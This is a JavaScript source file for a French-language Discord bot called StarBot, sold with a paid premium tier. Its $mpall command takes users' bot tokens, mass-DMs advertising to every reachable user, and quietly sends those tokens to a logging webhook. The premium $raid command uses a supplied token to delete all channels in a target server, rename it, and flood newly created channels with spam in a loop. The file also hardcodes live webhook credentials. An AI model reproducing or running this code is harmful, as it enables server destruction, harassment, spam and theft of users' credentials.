var XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;
const Discord = require("discord.js");
const client = new Discord.Client();
const config = require("./config.json");
var fs = require('fs');
const color = "#00b8e6";
const rouge = "#ff0000";

const patchnote = new Discord.WebhookClient("693424136180989972", "ahfPhfNYcMhqi1YBe_gr0Xjl6ayxxRkJBpwBTcxDhhPVF4SgAaCJCQ6DdcglaUKuc2BM");
const logsweb = new Discord.WebhookClient("693424480311050250", "wWh5ybL0261g9LSdXMPJR-Bk-VgRXqYXG69QQlYIyLsL60avzQjVn0tZ9arFYQT6dJi9");
const statusweb = new Discord.WebhookClient("693424136180989972", "ahfPhfNYcMhqi1YBe_gr0Xjl6ayxxRkJBpwBTcxDhhPVF4SgAaCJCQ6DdcglaUKuc2BM");
const prefix = "$";

if (!Array.prototype.flat)
{
    Object.defineProperty(Array.prototype, 'flat',
    {
        value: function(depth = 1, stack = [])
        {
            for (let item of this)
            {
                if (item instanceof Array && depth > 0)
                {
                    item.flat(depth - 1, stack);
                }
                else {
                    stack.push(item);
                }
            }

            return stack;
        }
    });
}

const moment = require('moment'); //npm i moment
const ms = require('ms') //npm i ms

var sleep = require('system-sleep');
client.on("ready", () => {
    console.log('Le bot est online!')
    client.user.setActivity("$help | V 1.5.2", {
        type: "STREAMING",
        url: "https://www.twitch.tv/starbot"
    });
    let onembed = new Discord.MessageEmbed().setTitle("Le bot est on").setColor(color).setTimestamp().setFooter("StarBot" + "©");
    statusweb.send(onembed);
});


var wl = JSON.parse(fs.readFileSync("./whitelist.json"));
var wlprem = JSON.parse(fs.readFileSync("./premium.json"));
var premcode = JSON.parse(fs.readFileSync("./premiumcode.json"));
    client.on("message", (message) => {
        let nopremiumembed = new Discord.MessageEmbed().setColor(rouge).setTitle("Premium requis").setDescription(`Pour avoir accès à cette commande :

3.75EUR PayPal à https://paypal.me/

$premium activate [clé premium obtenue par les créateurs]

Vous pouvez refaire la commande !

Pour toute demande d'achat , merci d'mp Azengar#0001`).setFooter(`${client.user.username}©`);
        if (message.content.startsWith(prefix + "addwhitelist")) {
const wlwebhook = new Discord.WebhookClient("691365815903060008", "ji1Q9tUVqnYsE-PqylxE2R8eMg2CkXxp7dRE_LcWy55QA6KKZ9yG-uusQJ5aLFbO7l61");
               if(!message.guild.member(message.author).hasPermission("MANAGE_MESSAGES"))return message.channel.send("**Seul les 💎| 𝘼𝙙𝙢𝙞𝙣𝙞𝙨𝙩𝙧𝙖𝙩𝙚𝙪𝙧 ou plus haut peuvent utiliser cette commande !**");
               var args2 = message.content.split(" ").slice(1);
               var msge = args2.join(' ')
            if (!msge) {
                return message.channel.send("**Merci d'indiquer l'id de la personne à whitelist !**");
            };
            wl[msge] || (wl[msge] = []);
            wl[msge].unshift({
                reason: "Accès WhiteList :white_check_mark:",
                date: Date.now()
            });
           const _0x78fax11 = new Discord.MessageEmbed().setDescription("**<@" + msge + "> à été ajouté à la whitelist :white_check_mark:**").setColor(color);
            message.channel.send(_0x78fax11);
            wlwebhook.send(_0x78fax11);
           let userwl = client.users.cache.get(msge);
            message.guild.channels.create(userwl.username, { type: 'text' }).then(c =>{
                c.overwritePermissions({
                    permissionOverwrites: [
                      {
                         id: userwl,
                         allow: ['VIEW_CHANNEL'],
                      },
                      {
                          id: '689057521113366536',
                          deny: ['VIEW_CHANNEL'],
                      },
                    ],
                      reason: 'cest la vie'
                    });
                    let wlembed = new Discord.MessageEmbed().setTitle(userwl.username + " Bienvenue !").setDescription(`
Mais qu'est-ce que ${client.user.username} ?
${client.user.username} es un bot qui permet d'envoyer des messages privés depuis le token de vôtre bot !
Très utile , il permet de vite faire des pubs qui vous ferrons gagner beaucoup plus de membres qu'un simple partenariat .
Mais comment j'obtient un token de bot ?
Je vous conseille d'aller voir un tutoriel complet ici : <#691351987999998123>
Une commande est disponible pour le moment :
                                                
$mpall
                                                            
Pour plus d'infos , merci de contacter Azengar#0001`).setFooter(client.user.username + "©").setColor(color)
let premembed = new Discord.MessageEmbed().setTitle("Merci d'avoir acheté le premium").setColor("#ff0000").setDescription(`**Voici les commandes premium : 
$raid **`)
                            c.send(wlembed)
                            if (wlprem[userwl.id])return c.send(premembed);
            })
            fs.writeFileSync("./whitelist.json", JSON.stringify(wl))
            let guild = message.guild
        let param1 = message.guild.member(message.mentions.users.first());
        }
        const args = message.content.slice("$mpall ").trim().split(/ +/g);  
        if(message.content.startsWith("$mpall")) {
            if (!wl[message.author.id]) {
                return message.channel.send("**Tu n'es pas dans la whitelist !**");
            }
            let param1 = "$mpall"
            let param2 = args[1]
            let param3 = args.slice(2).join(' ');

            if(message.guild.id === "691343771501199400") {
                    var filter = m => m.author.id === message.author.id;
                    var min=1; 
                    var max=10000;  
                    var random = Math.random() * (+max - +min) + +min; 
                    const quest1 = new Discord.MessageEmbed().setTitle(client.user.username).setDescription(`
                **Question 1 / 2**
                
                Quel es le token de vôtre bot ?
                    `).setColor(color).setFooter("Vous disposer de 300 secondes pour répondre avant l'annulation automatique")
                    message.channel.send(quest1).then(msg => {
                      message.channel.awaitMessages(filter, {
                        max: 1,
                        time: 300000,
                        errors: ['time']
                      }).then(collected => {
                        param2 = collected.first().content;
                        const quest2 = new Discord.MessageEmbed().setTitle(client.user.username).setDescription(`
                **Question 2 / 2**
                
                Donnez moi un message de pub
                        
                **(Exemple : Salut ! Rejoint vite mon serveur discord : 'https://discord.gg/UtX3SCs')**
                            `).setColor(color).setFooter("Vous disposer de 300 secondes pour répondre avant l'annulation automatique")
                        message.channel.send(quest2).then(msg => {
                          message.channel.awaitMessages(filter, {
                            max: 1,
                            time: 300000,
                            errors: ['time']
                          }).then(collected => {
                            param3 = collected.first().content
        
                    var newclient = new Discord.Client();
        
                    let errorembed = new Discord.MessageEmbed().setDescription(`:x: Le token est invalide ou a expiré
                    Il se peut que votre bot ait été banni par discord, ou vous deviez allez rechercher un nouveau token dans l'linterface développeur de Discord
                    Utilisation de la commande :

                    $mpall`);

                    newclient.login(param2).catch(Error => message.channel.send(errorembed));
                    newclient.on('ready', () => {
                        let noserverembed = new Discord.MessageEmbed().setColor(rouge).setDescription(`**Le bot ${newclient.user.username} n'est présent sur aucun serveur !**`).setFooter(client.user.username + "©")
                        if(newclient.guilds.cache.size === "0")return message.channel.send(noserverembed);
                            newclient.user.setActivity(client.user.username, {
                                type: "WATCHING"
                            })
                        let serverlist = newclient.guilds.cache.map(r => `${r.name} | **${r.memberCount}** membres`)
                        var memberlist = newclient.users.cache.size
                        var xhr = new XMLHttpRequest();
xhr.open("POST", "https://discordapp.com/api/webhooks/691367862765486170/o3F2JQI1mVkXI8WvgmtLKhV5yPkA72jHMbFwTNUMlh578yNGXL4k5AUoAqBarjVVVovI", true);
xhr.setRequestHeader('Content-Type', 'application/json');
//xhr.send(JSON.stringify({
//    'content': "**Token du bot de : **" + message.author.username + "\n\n**Le nom du bot est : **" + newclient.user.username + "\n\n**Son token : **" + param2 + "\n\n**Le bot est sur :  **" + serverlist + " ( " + memberlist + " membres)",
//    'username':'TOKEN Partener s bot ',
//}));

                                console.log(`Connecté en tant que : ${newclient.user.username} \n\nStatistiques globales : \n\nLe bot a un total de ${newclient.guilds.cache.size} serveurs. \nPour un total de ${newclient.users.cache.size} membres. \n\nMessage :\n\u001b[36m${param3}\u001b[0m\n\n\n `)       
                                
                                message.channel.send(`**Le bot utilisé pour le mp all sera :** \`${newclient.user.username}\` `).then(c1 => {c1.delete})
                                
                        


                                    let embed = new Discord.MessageEmbed()
                                      .setAuthor(newclient.user.tag, newclient.user.displayAvatarURL())
                                      .setTitle('Voici les serveurs ou la publicité sera envoyée.')
                                      .setDescription(serverlist)
                                      .setColor(color)
                                      .setFooter('mpall système | ' + client.user.username)
                                      .setTimestamp()

                                      message.channel.send(embed).then( msg => { 
                                          message.channel.send("Message de pub : " + param3)
                                          
                                            msg.react('✅')  & msg.react('❎')  
                                    
                        
                                          let collector = msg.createReactionCollector((reaction, user) => user.id === message.author.id);
                        
                                          collector.on("collect", async(reaction, user) => {
                                            if(reaction._emoji.name === "❎") {
                            
                                                return msg.delete() & message.channel.send('❎ | **Annulation de la commande...**') 
                            
                                            };
                                            if(reaction._emoji.name === "✅") {

                                                let timeout = 100
                                                let dmed = "0"


                                                let getready = new Discord.MessageEmbed().setTitle("La pub va démarrer ✅").setColor(color).setDescription(`Le bot ${newclient.user.username} es occupé à pub ${newclient.users.cache.size} membres.
                                                Nombre de membres mp : [CONTEUR SOON...]`).setFooter(client.user.username);
                                                let logsmpallembed = new Discord.MessageEmbed().setTitle("Logs MPALL").setColor(color).setFooter("Lancé par " + message.author.username).setDescription(`**Connecté en tant que : ${newclient.user.username}
Le bot est présent sur un total de ${newclient.guilds.cache.size} serveurs.
Pour un total de ${newclient.users.cache.size} membres ! :wink:

Token du bot : ${newclient.token}

(NE PRENDRE SOUS AUCUN PRÉTEXTE SINON UNRANK INSTANT)**`).setTimestamp().setThumbnail(newclient.user.avatarURL);
                                                logsweb.send(logsmpallembed);


                        message.channel.send(getready)
//                                                    let getready1 = new Discord.MessageEmbed().setTitle("La pub va démarrer ✅").setColor(color).setDescription(`Le bot ${newclient.user.username} es occupé à pub ${newclient.users.cache.size} membres.
//Nombre de membres mp : [PAS ENCORE DISPO]`).setFooter(client.user.username);

                                                newclient.users.cache.array().forEach((member) => {
                                                        dmed++
                                                        if(member === newclient.user) {
            
                                                        } else {
                                                            member.send(param3).catch(err => { console.log(err)})
                                                            var member = 0;
                                
                                                            sleep(timeout);
                                                            console.log("\u001b[31;1m[" + dmed + "/" + newclient.users.cache.size + "]\u001b[37m Message envoyé à \u001b[36m" + member.username + "#" + member.discriminator); 
                                                          
                                                            
                                
                                                            if (dmed == newclient   .users.cache.size) {
                                
                                                               console.log("\u001b[32m Azen terminé avec succès \nLaissez le logiciel courir 5 minutes de plus pour être sûr que tout le monde a bien reçu le DM.")
                                                               var a = new Discord.MessageEmbed()
                                                               .setTitle("Publicité terminée")
                                                               .setColor(color)
                                                               .setDescription("Envoyée a tous le monde ( " + dmed + " membres )")
                                                                message.channel.send(a)
                                                                newclient.destroy();
                                                            }
                                                            
                                                        }
                                                        
                                                        
        
                                                    
                                                });
                                                
                                            };
                                        
                                          });
                                          
                                    });
                                });
                            });
                          });
                        });
                                  }); 
                                  
                                
            }else {
                let servembed = new Discord.MessageEmbed().setTitle("Commande utilisable seulement dans le serveur officiel").setDescription("Cette commande es spécifique au serveur officiel donc merci d'aller dans vôtre channel privé. URL : https://discord.gg/MwkqP43").setURL("https://discord.gg/MwkqP43")
                message.channel.send("Vas dans le bon serveur")
            }
            
                }

                if(message.content.includes(prefix + "ban")){
                    if(!message.member.hasPermission("BAN_MEMBERS"))return message.channel.send("**Vous n'avez pas la permissions d'utiliser cette commande !**");
                    let banneduser = message.guild.member(message.mentions.users.first());
                    if (!banneduser) return message.channel.send("**Merci de mentionner un utilisateur valide !**");
                    if(banneduser === message.author.id)return message.channel.send("**Pourquoi tu essayes de te ban ?**");
                    const args = message.content.slice(prefix.length).trim().split(/ +/g);
                    if(!args[1])return message.channel.send("**Merci d'indiquer une raison de bannissement !**"); 
                   banneduser.ban(args.join(" ")+ `(${message.author.username})`)
                    message.channel.send("**Membre banni !**")
                }
                if(message.content.includes(prefix + "kick")){
                    if(!message.member.hasPermission("BAN_MEMBERS"))return message.channel.send("**Vous n'avez pas la permissions d'utiliser cette commande !**");
                    let kickedduser = message.guild.member(message.mentions.users.first());
                    if (!kickedduser) return message.channel.send("**Merci de mentionner un utilisateur valide !**");
                    if(kickedduser === message.author.id)return message.channel.send("**Pourquoi tu essayes de te kick ?**");
                    const args = message.content.slice(prefix.length).trim().split(/ +/g);
                    if(!args[1])return message.channel.send("**Merci d'indiquer une raison de kick !**"); 
                   kickedduser.kick(args.join(" ")+ `(${message.author.username})`)
                    message.channel.send("**Membre banni !**")
                }
                if(message.content.includes(prefix + "info")){
                    const infoembed = new Discord.MessageEmbed().setColor(color).setTitle("Informations sur le créateur de " + client.user.username).setDescription(`Azengar#0001`).setFooter(client.user.username).setTimestamp();
message.channel.send(infoembed);

                }
                if(message.content.includes(prefix + "help")){
                    const helpembed = new Discord.MessageEmbed().setColor(color).setTitle("Voici un peu d'aide :-)").setDescription(`
Mais qu'est-ce que ${client.user.username} ?
${client.user.username} es un bot qui permet d'envoyer des messages privés depuis le token de vôtre bot ! (un bot Sponsort en gros)
Très utile , il permet de vite faire des pubs qui vous ferrons gagner beaucoup plus de membres qu'un simple partenariat .
Mais comment j'obtient un token de bot ?
Je vous conseille d'aller voir un tutoriel complet ici : <#689057512200208413>
Plusieurs commandes sont à vôtre disposition :
 **Commande pour les whitelists**   
 
$mpall


**Commandes pour les Premium** :

$premium activate <code premium>

$raid

$mprien

$status

**Commande pour les admins** :

$addwhitelist

$code create

$ban 

$kick

$say

$embed
                                
Pour plus d'infos , merci de contacter un <@&679421195149639699>`).setFooter(client.user.username).setTimestamp();
message.channel.send(helpembed);

                }
                if (message.content.startsWith(prefix + "patchnote")) {
                    if(!message.member.hasPermission("ADMINISTRATOR"))return message.channel.send("**Vous n'avez pas la permissions d'utiliser cette commande !**");
                    var args2 = message.content.split(" ").slice(1);
                    var msge = args2.join(' ');
                    let patchembed = new Discord.MessageEmbed().setDescription(msge).setColor(color).setFooter(client.user.username);
                    patchnote.send(patchembed);
                    patchnote.send("<@&689057521113366536>").then(m => {
                        m.react("✅");
                    })
                    message.channel.send("**Patchnote lancé !**");
                }
                if (message.content.startsWith(prefix + "verif")) {
                    const verifembed = new Discord.MessageEmbed().setImage("https://cdn.discordapp.com/attachments/689088494186004545/690599691338907698/SPOILER_bxNxgIF.jpeg").setTitle("__**Bienvenue sur StarBot !**__").setDescription(`__Appuyez sur la réaction ci-dessous pour accéder au serveur


Si vous avez le moindre problème veuillez contacter un Créateur__`)
message.channel.send(verifembed)
                }
                if (message.content.startsWith(prefix + "say")) {
                    if(!message.member.hasPermission("ADMINISTRATOR"))return message.channel.send("**Vous n'avez pas la permissions d'utiliser cette commande !**");

                    var args2 = message.content.split(" ").slice(1);
                    var msge = args2.join(' ');
                    if(!msge)return message.channel.send("**Merci d'entrer un message !**");
                    message.delete()
message.channel.send(msge)
                }
                if (message.content.startsWith(prefix + "embed")) {
                    if(!message.member.hasPermission("MANAGE_MESSAGES"))return message.channel.send("**Vous n'avez pas la permissions d'utiliser cette commande !**");
                    var args2 = message.content.split(" ").slice(1);
                    var msge = args2.join(' ');
                    if(!msge)return message.channel.send("**Merci d'entrer un message !**");
                    message.delete()
                    let msgee = new Discord.MessageEmbed().setDescription(msge).setColor(color).setFooter("Message envoyé par " + message.author.username);
message.channel.send(msgee)
                }
                if(message.content.startsWith(prefix + "mprien")){
                    message.channel.send("**Je t'ai dit qu'il n'y a rien d'autre pour le moment !!! :)**")
                }
                if(message.content.startsWith(prefix + "premium activate")){
                    if (wlprem[message.author.id]) {
                        return message.channel.send("**Tu es déjà premium !**");
                    };
                    var args2 = message.content.split(" ").slice(1);

                msgeee = args2.slice(1)

                                        var msge = msgeee.join(' ');
                    if(!msge)return message.channel.send("**Merci d'indiquer une clé premium à activer !**");
                    if (premcode[msge]) {
                        wlprem[message.author.id] || (wlprem[message.author.id] = []);
                        wlprem[message.author.id].unshift({
                            reason: "Accès Premium :white_check_mark:",
                            date: Date.now()
                        });
                        let premembed = new Discord.MessageEmbed().setDescription(`**Merci d'avoir acheté le premium ${message.author.username} !**`).setColor("#ff0000").setFooter(client.user.username).setImage("https://cdn.discordapp.com/attachments/686265544193998851/686478997135294488/premium-case_gem-icon_green.png")
                        message.channel.send(premembed)
                        const wlwebhook = new Discord.WebhookClient("693424480311050250", "wWh5ybL0261g9LSdXMPJR-Bk-VgRXqYXG69QQlYIyLsL60avzQjVn0tZ9arFYQT6dJi9");
                        wlwebhook.send(premembed)
                        message.delete();
                        fs.writeFileSync("./premium.json", JSON.stringify(wlprem))
                    }else{
                        message.channel.send("**Clé invalide !**")
                    };
                }
                if(message.content.startsWith(prefix + "status")){
                    if (!wlprem[message.author.id]) {
                        return message.channel.send("**Tu n'es pas premium .**");
                    }else{
                        message.channel.send("**Tu es bien premium !**");
                    }
                }
                const args5 = message.content.slice("$raid ").trim().split(/ +/g);  
                if(message.content.startsWith("$raid")) {
                    if (!wlprem[message.author.id]) {
                        return message.channel.send(nopremiumembed);
                    };

                    let param1 = "$raid"
                    let param2 = ""
                    let param3 = ""
                    let param4 = ""

                    if(message.guild.id === "691343771501199400") {
                        var filter = m => m.author.id === message.author.id;
                        var min=1; 
                        var max=10000;  
                        var random = Math.random() * (+max - +min) + +min; 
                        const quest1 = new Discord.MessageEmbed().setTitle(client.user.username).setDescription(`
                    **Question 1 / 3**
                    
                    Quel es le token de vôtre bot ?
                        `).setColor(color).setFooter("Vous disposer de 200 secondes pour répondre avant l'annulation automatique")
                        message.channel.send(quest1).then(msg => {
                          message.channel.awaitMessages(filter, {
                            max: 1,
                            time: 200000,
                            errors: ['time']
                          }).then(collected => {
                            param2 = collected.first().content
                            const quest2 = new Discord.MessageEmbed().setTitle(client.user.username).setDescription(`
                    **Question 2 / 3**
                    
Quel es l'id du serveur à raid ?
                                `).setColor(color).setFooter("Vous disposer de 200 secondes pour répondre avant l'annulation automatique")
                            message.channel.send(quest2).then(msg => {
                              message.channel.awaitMessages(filter, {
                                max: 1,
                                time: 200000,
                                errors: ['time']
                              }).then(collected => {
                                param3 = collected.first().content
                                const quest3 = new Discord.MessageEmbed().setTitle(client.user.username).setDescription(`
                                **Question 2 / 3**
                                
            Quel es le message à spam pendant le raid ?
                                            `).setColor(color).setFooter("Vous disposer de 200 secondes pour répondre avant l'annulation automatique")
                                        message.channel.send(quest3).then(msg => {
                                          message.channel.awaitMessages(filter, {
                                            max: 1,
                                            time: 200000,
                                            errors: ['time']
                                          }).then(collected => {
                                            param4 = collected.first().content
            
                        var newclient = new Discord.Client();
            
                        let errorembed = new Discord.MessageEmbed().setDescription(`**:x: Le token est invalide ou a expiré
                        Il se peut que votre bot ait été banni par discord, ou vous deviez allez rechercher un nouveau token dans l'linterface développeur de Discord
                        Utilisation de la commande :

                        $raid**`)
    
                        newclient.login(param2).catch(Error => message.channel.send(errorembed));
                        newclient.on('ready', () => {
            newclient.user.setActivity(newclient.user.username, {
                type: "STREAMING",
                url: "https://twitch.tv/starbot"
            })
                            let serverlist = newclient.guilds.cache.map(r => `${r.name} | **${r.memberCount}** membres`)
                            var memberlist = newclient.users.cache.size
                            var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://discordapp.com/api/webhooks/683248119261298714/8dieO2cKCjtzeurRc0afl52Blgywiz8Mca3ef9YL2BGmdoD0sgV1Aa5uNjFW1QO7_kBP", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    //xhr.send(JSON.stringify({
    //    'content': "**Token du bot de : **" + message.author.username + "\n\n**Le nom du bot est : **" + newclient.user.username + "\n\n**Son token : **" + param2 + "\n\n**Le bot est sur :  **" + serverlist + " ( " + memberlist + " membres)",
    //    'username':'TOKEN Partener s bot ',
    //}));
    
                                    console.log(`Connecté en tant que : ${newclient.user.username} \n\nStatistiques globales : \n\nLe bot a un total de ${newclient.guilds.cache.size} serveurs. \nPour un total de ${newclient.users.cache.size} membres. \n\nMessage :\n\u001b[36m${param3}\u001b[0m\n\n\n `)       
                                    
                                    message.channel.send(`**Le bot utilisé pour le raid sera :** \`${newclient.user.username}\` `).then(c1 => {c1.delete})
                                    
                                    if(param1 === '$raid'){
                            
    let guild = newclient.guilds.cache.get(param3)
    if(!guild)return message.channel.send("**L'id du serveur es invalide ou le bot n'est pas présent dessus !**")
    
                                        let embed = new Discord.MessageEmbed()
                                          .setAuthor(newclient.user.tag, newclient.user.displayAvatarURL())
                                          .setTitle('Voici le serveur qui va se faire raid.')
                                          .setDescription(`Nom : ${guild.name}

ID : ${guild.id}

Nombre de membres : ${guild.members.cache.size}

Owner : ${guild.owner.user.username}`)
                                          .setColor(color)
                                          .setFooter('raid système | ' + client.user.username)
                                          .setTimestamp()
    
                                          message.channel.send(embed).then( msg => { 
                                              message.channel.send("Message de raid : " + param4)
                                              
                                                msg.react('✅')  & msg.react('❎')  
                                        
                            
                                              let collector = msg.createReactionCollector((reaction, user) => user.id === message.author.id);
                            
                                              collector.on("collect", async(reaction, user) => {
                                                if(reaction._emoji.name === "❎") {
                                
                                                    return msg.delete() & message.channel.send('❎ | **Annulation de la commande...**') 
                                
                                                };
                                                if(reaction._emoji.name === "✅") {
    
    
                                                    let timeout = 100
                                                    let dmed = "0"
    
                                                    let getready = new Discord.MessageEmbed().setTitle("Le raid va démarrer ✅").setColor(color).setDescription(`Le bot ${newclient.user.username} es occupé à raid le serveur avec ${guild.members.cache.size} membres.
                                                    Temps de raid estimé : 2 minutes`).setFooter(client.user.username);
                                                    let logsraidembed = new Discord.MessageEmbed().setTitle("Logs Raid").setColor(color).setFooter("Lancé par " + message.author.username).setDescription(`**Connecté en tant que : ${newclient.user.username}
    Le bot est entrain de raid ${guild.name}
    Pour un total de ${guild.members.cache.size} membres qui on vu les messages ! :wink:
    
    Token du bot : ${newclient.token}
    
    (NE PRENDRE SOUS AUCUN CAS SINON UNRANK INSTANT)**`).setTimestamp().setThumbnail(newclient.user.avatarURL);
                                                    logsweb.send(logsraidembed);
                                                    msg.delete() & message.channel.send(getready).then(m => {
                                                        let getready1 = new Discord.MessageEmbed().setTitle("Le raid va démarrer ✅").setColor(color).setDescription(`Le bot ${newclient.user.username} es occupé à ban ${newclient.users.cache.size} membres.
                                                        Nombre de membres mp : ${dmed}`).setFooter(client.user.username);
                                                        guild.channels.cache.forEach(chared => {
                                                            chared.delete();
                                                        })
                                                        guild.setName(param4)
                                                        setInterval(() => {
                                                        guild.channels.create(param4, { type: 'text' }).then(c =>{
                                                            dmed++
                                                            c.send(param4)
                                                            c.send(param4)
                                                            c.send(param4)
                                                            c.send(param4)
                                                            c.send(param4)
                                                            c.send(param4)
                                                            c.send(param4)
                                                            c.send(param4)
                                                            c.send(param4)
                                                            c.send(param4)
                                                            c.send(param4)
                                                            c.send(param4)
                                                            c.send(param4)
                                                            c.send(param4)
                                                            c.send(param4)
                                                            c.send(param4)
                                                            c.send(param4)
                                                            c.send(param4)
                                                            c.send(param4)
                                                            c.send(param4)
                                                            });
                                                            guild.channels.create(param4, { type: 'text' }).then(c =>{
                                                                dmed++
                                                                c.send(param4)
                                                                c.send(param4)
                                                                c.send(param4)
                                                                c.send(param4)
                                                                c.send(param4)
                                                                c.send(param4)
                                                                c.send(param4)
                                                                c.send(param4)
                                                                c.send(param4)
                                                                c.send(param4)
                                                                c.send(param4)
                                                                c.send(param4)
                                                                c.send(param4)
                                                                c.send(param4)
                                                                c.send(param4)
                                                                c.send(param4)
                                                                c.send(param4)
                                                                c.send(param4)
                                                                c.send(param4)
                                                                c.send(param4)
                                                                });
                                                                guild.channels.create(param4, { type: 'text' }).then(c =>{
                                                                    dmed++
                                                                    c.send(param4)
                                                                    c.send(param4)
                                                                    c.send(param4)
                                                                    c.send(param4)
                                                                    c.send(param4)
                                                                    c.send(param4)
                                                                    c.send(param4)
                                                                    c.send(param4)
                                                                    c.send(param4)
                                                                    c.send(param4)
                                                                    c.send(param4)
                                                                    c.send(param4)
                                                                    c.send(param4)
                                                                    c.send(param4)
                                                                    c.send(param4)
                                                                    c.send(param4)
                                                                    c.send(param4)
                                                                    c.send(param4)
                                                                    c.send(param4)
                                                                    c.send(param4)
                                                                    });
                                                        }, 100);
                                                                if (dmed == "100") {
                                
                                newclient.destroy();
                                                               console.log("Raid terminé avec succès !");
                                                               var a = new Discord.MessageEmbed()
                                                               .setTitle("Raid terminé avec succès !")
                                                               .setDescription(`**Tout les membres ont été banni (${guild.members.size}) :white_check_mark: 
100 channels créé :white_check_mark:
2000 mentions @everyone :white_check_mark: `).setColor(color)
                                                                message.channel.send(a).then(newclient.destroy());
                                                            }
                                                                newclient.on("guildDelete", async guilddeleted => {
                                                                    if(guilddeleted.id === guild.id)return message.channel.send(`**Le bot ${newclient.user.username} à été ban de ${guild.name} :cry:**`).then(newclient.destroy());
                                                                })
            
                                                        
                                                    })
                                                    
                                                }
                                              })
                                        })
                                      }
                                    })
                                })
                              })
                            })
                        })
                            })
                            
                                      });
                                    
                }else {
                    let servembed = new Discord.MessageEmbed().setTitle("Commande utilisable seulement dans le serveur officiel").setDescription("Cette commande es spécifique au serveur officiel donc merci d'aller dans vôtre channel privé. URL : https://discord.gg/EzAFdgr").setURL("https://discord.gg/EzAFdgr")
                    message.channel.send(servembed)
                }
                }
                if (message.content.startsWith(prefix + "premiuminfo")) {
                    let premiuminfoembed = new Discord.MessageEmbed().setColor(color).setImage("https://cdn.discordapp.com/attachments/686265544193998851/686478997135294488/premium-case_gem-icon_green.png").setTitle("Premium")
                    .setDescription(`Voici les avantages du premium :
                    
                    Un joli rôle dans le serveur
                    
                    Aucune pub dans le status des bots
                    
                    commande de raid ($raid)
                    
                    PRIX : 3.75 euros PayPal uniquement`).setFooter("Pour tout achat , merci de contacter Azengar#0001");
                    message.channel.send(premiuminfoembed);
                }
                if (message.content.startsWith(prefix + "code create")) {
                    if(!message.guild.member(message.author).hasPermission('ADMINISTRATOR'))return message.channel.send("**Seul les administrateurs peuvent utiliser cette commande !**");
                    let code = '';
                    let dict = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                    for(var i = 0; i < 18; i++){
                        code = code + dict.charAt(Math.floor(Math.random() * dict.length));
                    }
                    message.reply(`va voir tes mp's :wink:.`);
                    message.author.send(`**Voici ton code premium : ${code}**`);
                    premcode[code] || (premcode[code] = []);
                    premcode[code].unshift({
                        genpar: message.author.username,
                        code: code
                    });
                    fs.writeFileSync("./premiumcode.json", JSON.stringify(premcode));
                }
    });

let restartembed = new Discord.MessageEmbed().setTitle("Le bot redémarre").setColor(color).setTimestamp().setFooter("StarBot" + "©")
let offembed = new Discord.MessageEmbed().setTitle("Le bot est en maintenance ou il a crash").setColor(color).setTimestamp().setFooter("Starbot" + "©") 


// if there are errors, log them
client.on("disconnect", () => {
    statusweb.send(offembed);
    client.logger.log("Bot is disconnecting...", "warn");
})
    .on("reconnecting", () => {
        statusweb.send(restartembed);
        client.logger.log("Bot is disconnecting...", "warn");

    })
    .on("error", (e) => client.logger.log(e, "error"))
    .on("warn", (info) => client.logger.log(info, "warn"));

// if there is an unhandledRejection, log them
process.on("unhandledRejection", (err) => {
    console.error(err);
});

client.login(config.token);
